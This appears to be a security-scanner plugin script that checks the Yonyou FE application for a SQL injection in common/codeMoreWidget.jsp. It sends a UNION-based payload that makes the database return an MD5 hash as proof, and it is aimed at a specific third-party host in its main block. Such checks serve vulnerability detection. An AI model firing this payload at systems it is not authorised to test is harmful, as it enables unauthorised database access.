#!/usr/bin/env python
# -*- coding: utf-8 -*-
#ref: http://www.wooyun.org/bugs/wooyun-2015-0116706

def assign(service, arg):
    if service == "yongyou_fe":
        return True, arg
        
def audit(arg):
    payload = 'common/codeMoreWidget.jsp?code=12%27%20UNION%20ALL%20SELECT%20sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))--'
    url = arg + payload
    code, head, res, errcode, _ = curl.curl2(url)
    if (code == 500 or code == 200) and '81dc9bdb52d04dc20036dbd8313ed055' in res:
        security_hole(url + '   found sql injection!')

if __name__ == '__main__':
    from dummy import *
    audit(assign('yongyou_fe', 'http://fe.hy-la.com:8088/')[1])